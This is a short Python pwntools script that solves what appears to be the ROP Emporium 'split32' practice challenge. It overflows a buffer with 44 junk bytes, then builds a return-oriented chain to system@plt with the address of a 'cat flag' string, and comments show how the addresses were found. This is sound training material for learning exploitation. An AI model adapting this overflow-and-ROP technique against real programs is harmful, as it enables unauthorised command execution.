#!/usr/bin/env python3

from pwn import *

binary = ELF("./split32")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 44
PADDING = p32(0)
SYSTEM_CALL_ADDR = p32(0x80483e0)
BIN_CAT_FLAG_ADDR = p32(0x0804a030)

rop.raw(b"A"*OFFSET)                # junk: EIP offset
rop.raw(SYSTEM_CALL_ADDR)           # system@plt: objdump -d split | grep system@plt 
rop.raw(PADDING)
rop.raw(BIN_CAT_FLAG_ADDR)          # cat addr: rabin2 -z split

# chain: junk + system@plt + BBBB + cat address
p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
